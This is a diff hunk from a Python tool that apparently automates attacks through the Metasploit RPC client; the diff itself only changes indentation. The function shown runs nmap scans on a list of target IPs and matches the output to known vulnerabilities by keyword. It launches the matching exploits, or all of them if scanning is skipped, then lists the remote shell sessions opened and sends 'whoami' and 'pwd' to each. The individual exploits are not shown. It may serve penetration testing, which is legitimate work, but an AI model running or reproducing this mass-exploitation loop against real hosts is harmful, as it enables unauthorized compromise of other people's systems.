@@ -396,100 +396,100 @@ def is_valid_ip(ip):
 # TODO: @ chris make error messages pop up when trying to run this if run without
 # RHOSTS having any IP's 
 def full_exploitation_cycle():
-        global NMAP_AGGRESSIVENESS, RHOSTS, RUN_NMAP, client
+    global NMAP_AGGRESSIVENESS, RHOSTS, RUN_NMAP, client
+    
+    nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
+
+    # Check if the client is initialized
+    if client is None:
+        messagebox.showerror("Error", "Metasploit client is not initialized. Please start Metasploit first.")
+        return
+
+    # Filter out invalid IP addresses from RHOSTS
+    RHOSTS = [ip for ip in RHOSTS if is_valid_ip(ip)]
+    if not RHOSTS:
+        messagebox.showerror("Error", "No valid IP addresses found in RHOSTS.")
+        return
+
+
+    for RHOST in RHOSTS:
+        print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
+        # Decides if we want to run nmap or just assumes all outputs work
+        nmapOutput = nmap_dest._nmap_sample_ouput
+        if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
+            ######## RECONAISSANCE PHASE ########
+            nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
+            # print(nmapOutput)
+            if (nmapOutput[1][0:22] == "Note: Host seems down."):
+                print("Host seems down. Exiting.")
+                exit()
+
+        ######## WEAPONIZATION PHASE ########
+        vulnerabilitiesToUse = set()
+        vulnInfos = []
+        for i in range(len(vulnerabilities)):
+            vulnInfos.append(dict())
+            vulnInfos[i]["keywords"] = set()
+            vulnInfos[i]["optionalKeywords"] = set()
+        # Scan nmap output for key terms
+        for line in nmapOutput:
+            # Detect what keywords each line of the nmap output contains and compare those to the descriptions
+            # for each known vulnerability and add matched key terms to vulnInfosDict
+            for (i, vulnerability) in enumerate(vulnerabilities):
+                flag = re.IGNORECASE
+                if vulnerability.caseSensitiveKeyTermMatch:
+                    flag = 0
+                for keyword in vulnerability.keywords:
+                    if re.search(keyword, line, flag):
+                        vulnInfos[i]["keywords"].add(keyword)
+                for optionalKeyword in vulnerability.optionalKeywords:
+                    if re.search(optionalKeyword, line, flag):
+                        vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
+
+            # Determine which vulns to use based off NMAP scan
+            # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
+            for (i, vulnInfo) in enumerate(vulnInfos):
+                if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
+                    print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
+                    vulnerabilitiesToUse.add(vulnerabilities[i])
+        else:
+            # here we don't run nmap and just assume that all vulnerabilities work
+            print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
+            vulnerabilitiesToUse = vulnerabilities
         
-        nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
+        # replace keywords in nmap scan with colored keywords
+        coloredNmapOutput = colorNmapOutput(nmapOutput)
+        # TODO: @chris make a separate window or figure out somewhere for 
+        # coloredNmapOutput to be displayed in for the user to see
+        for line in coloredNmapOutput:
+            print(line)
 
-        # Check if the client is initialized
-        if client is None:
-            messagebox.showerror("Error", "Metasploit client is not initialized. Please start Metasploit first.")
-            return
+        display_colored_nmap_output(coloredNmapOutput) # Display colored Nmap output in a new window
+        
+        ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
+        savedOutputInfo = runExploits(vulnerabilitiesToUse)
 
-        # Filter out invalid IP addresses from RHOSTS
-        RHOSTS = [ip for ip in RHOSTS if is_valid_ip(ip)]
-        if not RHOSTS:
-            messagebox.showerror("Error", "No valid IP addresses found in RHOSTS.")
-            return
+    ####### Print some info on the sessions created
+    print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
+    sessions = client.sessions.list
+    numSessions = 0
+    for k in client.sessions.list.keys():
+        numSessions += 1
+    print("Number of sessions created:", numSessions)
 
+    print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
+    for k in client.sessions.list.keys():
+        shell = client.sessions.session(str(k))
+        shell.write('whoami')
+        shell.write('pwd')
+        print(shell.read())
 
-        for RHOST in RHOSTS:
-            print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
-            # Decides if we want to run nmap or just assumes all outputs work
-            nmapOutput = nmap_dest._nmap_sample_ouput
-            if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
-                ######## RECONAISSANCE PHASE ########
-                nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
-                # print(nmapOutput)
-                if (nmapOutput[1][0:22] == "Note: Host seems down."):
-                    print("Host seems down. Exiting.")
-                    exit()
-
-            ######## WEAPONIZATION PHASE ########
-            vulnerabilitiesToUse = set()
-            vulnInfos = []
-            for i in range(len(vulnerabilities)):
-                vulnInfos.append(dict())
-                vulnInfos[i]["keywords"] = set()
-                vulnInfos[i]["optionalKeywords"] = set()
-            # Scan nmap output for key terms
-            for line in nmapOutput:
-                # Detect what keywords each line of the nmap output contains and compare those to the descriptions
-                # for each known vulnerability and add matched key terms to vulnInfosDict
-                for (i, vulnerability) in enumerate(vulnerabilities):
-                    flag = re.IGNORECASE
-                    if vulnerability.caseSensitiveKeyTermMatch:
-                        flag = 0
-                    for keyword in vulnerability.keywords:
-                        if re.search(keyword, line, flag):
-                            vulnInfos[i]["keywords"].add(keyword)
-                    for optionalKeyword in vulnerability.optionalKeywords:
-                        if re.search(optionalKeyword, line, flag):
-                            vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
-
-                # Determine which vulns to use based off NMAP scan
-                # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
-                for (i, vulnInfo) in enumerate(vulnInfos):
-                    if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
-                        print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
-                        vulnerabilitiesToUse.add(vulnerabilities[i])
-            else:
-                # here we don't run nmap and just assume that all vulnerabilities work
-                print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
-                vulnerabilitiesToUse = vulnerabilities
-            
-            # replace keywords in nmap scan with colored keywords
-            coloredNmapOutput = colorNmapOutput(nmapOutput)
-            # TODO: @chris make a separate window or figure out somewhere for 
-            # coloredNmapOutput to be displayed in for the user to see
-            for line in coloredNmapOutput:
-                print(line)
-
-            display_colored_nmap_output(coloredNmapOutput) # Display colored Nmap output in a new window
-            
-            ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
-            savedOutputInfo = runExploits(vulnerabilitiesToUse)
-
-        ####### Print some info on the sessions created
-        print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
-        sessions = client.sessions.list
-        numSessions = 0
-        for k in client.sessions.list.keys():
-            numSessions += 1
-        print("Number of sessions created:", numSessions)
-
-        print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
-        for k in client.sessions.list.keys():
-            shell = client.sessions.session(str(k))
-            shell.write('whoami')
-            shell.write('pwd')
-            print(shell.read())
-
-        # print out saved info from running exploits
-        print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
-        for v in savedOutputInfo.keys():
-            print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
-            for line in savedOutputInfo[v]:
-                print(line)
+    # print out saved info from running exploits
+    print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
+    for v in savedOutputInfo.keys():
+        print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
+        for line in savedOutputInfo[v]:
+            print(line)
 
 ###################################### The GUI ######################################
 
